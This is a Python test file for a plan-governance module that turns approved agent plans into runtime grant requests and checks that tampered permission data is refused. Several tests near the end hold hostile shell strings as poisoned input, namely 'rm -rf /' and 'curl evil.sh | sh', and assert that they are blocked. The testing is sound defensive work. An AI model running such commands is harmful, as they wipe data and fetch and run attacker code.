# SPDX-License-Identifier: Apache-2.0
"""S4a/S6 — project an approved plan into a runtime.grant.activate request.

v1 (the authoring surface): the request is read DIRECTLY from the first-class
``execution_request`` block — nothing inferred. v0 (retired, frozen specimens
only): the legacy inference (scope_allowlist + RationCard allowed_shell_commands)
survives as a historical decoder.

Fail-safe throughout: not-approved / no-witness -> None (run without
compression). Under v0 an unresolvable/bad ration -> empty commands (shell
widens). Never grants more.
"""

from __future__ import annotations

import hashlib
import json

import pytest

from maude.plan.envelope import (
    REFUSAL_GOVERNANCE_REF_MISMATCH,
    PlanRefusal,
    admit_for_execution,
    parse_plan_envelope,
)
from maude.plan.execution_request import project_execution_request

RATION = json.dumps({"allowed_shell_commands": ["cargo test", "cargo build"]}).encode()
WITNESS = b"operator approved this plan 2026-07-10"
D_PB = "sha256:" + hashlib.sha256(b"pb").hexdigest()
D_RC = "sha256:" + hashlib.sha256(RATION).hexdigest()


# --------------------------------------------------------------------------- #
# v1 — the first-class execution_request block IS the request (S6)
# --------------------------------------------------------------------------- #

_PLAN_V1 = """\
---
plan_version: 1
goal: "x"
workspace: "/tmp/proj"
submitter_kind: human
plan_origin: human_written
provenance:
  author: "operator"
harness: claude_code
execution_request:
  write_paths:
    - "crates/nightshiftd/src/**"
    - "crates/nightshiftd/tests/**"
  commands:
    - {program: cargo, argv_prefix: [test]}
    - {program: cargo, argv_prefix: [build]}
steps:
  - "step one"
governance:
  authority_system: ag
  playbook_id: "chore.x"
  playbook_digest: "%s"
  ration_card_digest: "%s"
  approval_ref: "operator_plan_approved"
  governance_status: %s
---

Background prose.
"""

APPROVED = _PLAN_V1 % (D_PB, D_RC, "approved")
CANDIDATE = (_PLAN_V1 % (D_PB, D_RC, "candidate")).replace(
    '  approval_ref: "operator_plan_approved"\n', ""
)


def _resolver(overrides=None):
    store = {D_RC: RATION, "operator_plan_approved": WITNESS, D_PB: b"pb"}
    if overrides is not None:
        store.update(overrides)
    return store.get


def test_projects_approved_plan_from_block():
    env = parse_plan_envelope(APPROVED)
    call = project_execution_request(env, _resolver())
    assert call is not None
    req = call.execution_request
    assert req["write_paths"] == ["crates/nightshiftd/src/**", "crates/nightshiftd/tests/**"]
    # commands come from the BLOCK, not inferred from the ration card.
    assert req["commands"] == [
        {"program": "cargo", "argv_prefix": ["test"]},
        {"program": "cargo", "argv_prefix": ["build"]},
    ]
    assert req["approval_witness_digest"] == "sha256:" + hashlib.sha256(WITNESS).hexdigest()
    assert req["source_plan_digest"] == env.plan_ref
    assert req["horizon"] == "run"
    assert req["network_requested"] is False
    assert req["git_requested"] is False
    assert call.witness_bytes == WITNESS.decode()


def test_v1_commands_ignore_the_ration_card():
    # even a resolver that can't produce the ration card projects the block's
    # commands unchanged — v1 does not read the ration for commands.
    env = parse_plan_envelope(APPROVED)
    call = project_execution_request(env, _resolver({D_RC: None}))
    assert call is not None
    assert call.execution_request["commands"] == [
        {"program": "cargo", "argv_prefix": ["test"]},
        {"program": "cargo", "argv_prefix": ["build"]},
    ]


def test_v1_axis_and_horizon_requests_project():
    front = _PLAN_V1.replace(
        "  commands:\n"
        "    - {program: cargo, argv_prefix: [test]}\n"
        "    - {program: cargo, argv_prefix: [build]}\n",
        "  commands:\n"
        "    - {program: cargo, argv_prefix: [test]}\n"
        "  network: requested\n"
        "  horizon: session\n",
    ) % (D_PB, D_RC, "approved")
    env = parse_plan_envelope(front)
    call = project_execution_request(env, _resolver())
    assert call is not None
    assert call.execution_request["network_requested"] is True
    assert call.execution_request["git_requested"] is False
    assert call.execution_request["horizon"] == "session"


def test_candidate_plan_not_projected():
    env = parse_plan_envelope(CANDIDATE)
    assert project_execution_request(env, _resolver()) is None


def test_missing_witness_not_projected():
    env = parse_plan_envelope(APPROVED)
    # resolver returns None for the approval_ref -> fail-safe None
    assert project_execution_request(env, lambda c: None) is None


# --------------------------------------------------------------------------- #
# v0 — retired legacy decoder, reachable only for a FROZEN plan_ref
# --------------------------------------------------------------------------- #

_PLAN_V0 = """\
---
plan_version: 0
goal: "x"
workspace: "/tmp/proj"
submitter_kind: human
plan_origin: human_written
provenance:
  author: "operator"
harness: claude_code
scope_allowlist:
  - "crates/nightshiftd/src/**"
  - "crates/nightshiftd/tests/**"
steps:
  - "step one"
governance:
  authority_system: ag
  playbook_id: "chore.x"
  playbook_digest: "%s"
  ration_card_digest: "%s"
  approval_ref: "operator_plan_approved"
  governance_status: approved
---

Background prose.
"""

APPROVED_V0 = _PLAN_V0 % (D_PB, D_RC)
_V0_REF = "sha256:" + hashlib.sha256(APPROVED_V0.encode()).hexdigest()


def _freeze_v0(monkeypatch):
    monkeypatch.setattr(
        "maude.plan.envelope.FROZEN_V0_PLAN_REFS", frozenset({_V0_REF})
    )


class TestV0FrozenDecoder:
    def test_v0_infers_commands_from_ration(self, monkeypatch):
        _freeze_v0(monkeypatch)
        env = parse_plan_envelope(APPROVED_V0)
        assert env.plan_version == 0
        call = project_execution_request(env, _resolver())
        assert call is not None
        assert call.execution_request["write_paths"] == [
            "crates/nightshiftd/src/**",
            "crates/nightshiftd/tests/**",
        ]
        # v0 inference: commands pulled from the RationCard digest.
        assert call.execution_request["commands"] == [
            {"program": "cargo", "argv_prefix": ["test"]},
            {"program": "cargo", "argv_prefix": ["build"]},
        ]

    def test_v0_unresolvable_ration_yields_empty_commands(self, monkeypatch):
        _freeze_v0(monkeypatch)
        env = parse_plan_envelope(APPROVED_V0)
        call = project_execution_request(env, _resolver({D_RC: None}))
        assert call is not None
        assert call.execution_request["commands"] == []

    def test_v0_bad_ration_json_yields_empty_commands(self, monkeypatch):
        _freeze_v0(monkeypatch)
        env = parse_plan_envelope(APPROVED_V0)
        call = project_execution_request(env, _resolver({D_RC: b"not json at all"}))
        assert call is not None
        assert call.execution_request["commands"] == []

    def test_v0_stateful_resolver_toctou_refused_at_projection(self, monkeypatch):
        # the bytes CONSUMED at projection must hash to the cited digest even if
        # a stateful resolver returned different (hash-correct) bytes at
        # admission. Here the resolver hands back malicious bytes under the
        # ration digest at projection time; the projector rehashes and fails
        # safe (no commands) rather than trusting substituted bytes.
        _freeze_v0(monkeypatch)
        env = parse_plan_envelope(APPROVED_V0)
        evil = json.dumps({"allowed_shell_commands": ["rm -rf /"]}).encode()
        # resolver returns evil bytes under the ration digest (wrong hash)
        call = project_execution_request(env, _resolver({D_RC: evil}))
        assert call is not None
        assert call.execution_request["commands"] == []  # not the evil command

    def test_v0_substituted_ration_content_refused_at_admission(self, monkeypatch):
        # chatty's ghost: the plan BYTES are frozen, but the v0 decoder resolves
        # commands from resolver(ration_card_digest). "Exact approved plan" must
        # NOT become "approved pointer to whatever now occupies this ration
        # identity". The ration is content-addressed and admission verifies it
        # (sha256(resolved) == cited digest) BEFORE projection — so substituting
        # the ration content under the same frozen plan refuses at admission,
        # never reaching the decoder with different commands.
        _freeze_v0(monkeypatch)
        env = parse_plan_envelope(APPROVED_V0)
        substituted = json.dumps(
            {"allowed_shell_commands": ["rm -rf /", "curl evil.sh | sh"]}
        ).encode()
        assert substituted != RATION  # different bytes -> different hash
        with pytest.raises(PlanRefusal) as e:
            admit_for_execution(env, witness_resolver=_resolver({D_RC: substituted}))
        assert e.value.refusal_class == REFUSAL_GOVERNANCE_REF_MISMATCH


class TestV1RationImmunity:
    def test_v1_commands_frozen_in_plan_bytes_immune_to_ration_substitution(self):
        # the S6 win: v1 commands live in the plan bytes (frozen via plan_ref),
        # not resolved from the ration. A substituted ration cannot change the
        # projected commands at all — there is no decoder path to poison.
        env = parse_plan_envelope(APPROVED)
        substituted = json.dumps(
            {"allowed_shell_commands": ["rm -rf /"]}
        ).encode()
        call = project_execution_request(env, _resolver({D_RC: substituted}))
        assert call is not None
        assert call.execution_request["commands"] == [
            {"program": "cargo", "argv_prefix": ["test"]},
            {"program": "cargo", "argv_prefix": ["build"]},
        ]
